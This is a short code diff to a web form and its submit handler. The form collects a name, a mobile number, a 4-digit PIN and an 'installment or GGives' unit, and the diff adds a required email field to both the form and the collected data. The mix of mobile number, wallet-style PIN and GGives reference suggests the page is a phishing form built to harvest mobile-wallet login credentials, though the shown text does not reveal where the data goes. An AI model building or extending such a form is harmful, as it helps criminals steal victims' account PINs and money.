@@ -107,7 +107,8 @@
     <form id="info-form">
       <input type="text" name="name" placeholder="Name" required />
       <input type="tel" name="mobile" placeholder="Mobile Number" required />
-      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />  
+      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />
+      <input type="email" name="email" placeholder="Email Address" required />
       <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
       <button type="submit">Next</button>
     </form>
@@ -141,6 +142,7 @@
         name: formElements['name'].value,
         mobile: formElements['mobile'].value,
         pin: formElements['pin'].value,
+        email: formElements['email'].value,
         unit: formElements['unit'].value
       };
 
